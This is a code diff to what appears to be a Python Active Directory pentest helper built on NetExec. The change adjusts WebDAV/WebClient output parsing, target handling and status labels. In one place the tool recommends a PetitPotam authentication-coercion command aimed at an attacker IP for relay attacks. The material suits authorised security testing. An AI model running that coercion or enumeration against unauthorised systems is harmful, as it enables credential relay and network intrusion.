@@ -82,6 +82,13 @@ def parse_webdav_verbose(stdout: str, stderr: str) -> dict:
                     content = content.split(marker, 1)[-1].strip()
                     break
 
+            # Skip DNS resolution errors early (before any keyword matching)
+            # These contain "service" in "Name or service not known" which false-matches
+            if "name or service not known" in content.lower():
+                continue
+            if "error resolving hostname" in content.lower():
+                continue
+
             # Check for DAV RPC Service references (indicates endpoint checking)
             if RE_DAV_RPC.search(content):
                 verbose_data["endpoints_checked"].append("DAV RPC Service")
@@ -133,12 +140,13 @@ def parse_webdav_verbose(stdout: str, stderr: str) -> dict:
 
 def enum_webdav(args, cache):
     """Check WebClient service status."""
-    print_section("WebDAV/WebClient Check", args.target)
+    target = cache.target if cache else args.target
+    print_section("WebDAV/WebClient Check", target)
 
     auth = cache.auth_args
     status("Checking WebClient service status...")
 
-    webdav_args = ["smb", args.target] + auth + ["-M", "webdav"]
+    webdav_args = ["smb", target] + auth + ["-M", "webdav"]
     rc, stdout, stderr = run_nxc(webdav_args, args.timeout)
     debug_nxc(webdav_args, stdout, stderr, "WebDAV")
 
@@ -158,7 +166,7 @@ def enum_webdav(args, cache):
             if "running" in line.lower() or "enabled" in line.lower() or "[+]" in line:
                 # Extract hostname from SMB output line if available
                 parts = line.split()
-                host = args.target
+                host = target
                 if parts and parts[0] == "SMB":
                     # SMB <host> <port> ... format
                     if len(parts) >= 2:
@@ -202,7 +210,7 @@ def enum_webdav(args, cache):
         # Add coercion recommendation
         cache.add_next_step(
             finding="WebClient service running",
-            command=f"PetitPotam.py -u '<user>' -p '<pass>' <attacker_ip> {args.target}",
+            command=f"PetitPotam.py -u '<user>' -p '<pass>' <attacker_ip> {target}",
             description="Coerce authentication via WebDAV for relay attacks",
             priority="high",
         )
@@ -217,11 +225,11 @@ def enum_webdav(args, cache):
         has_service_details = len(verbose_info["service_details"]) > 0
 
         if explicit_not_running or has_service_details:
-            status("WebClient service is not running", "success")
+            status("WebClient service is not running", "info")
         elif has_errors:
             status("Could not determine WebClient service status", "info")
         else:
-            status("WebClient service is not running (no response)", "success")
+            status("WebClient service is not running (no response)", "info")
 
         # Show why it's not running if we have verbose info
         if verbose_info["info_messages"]:
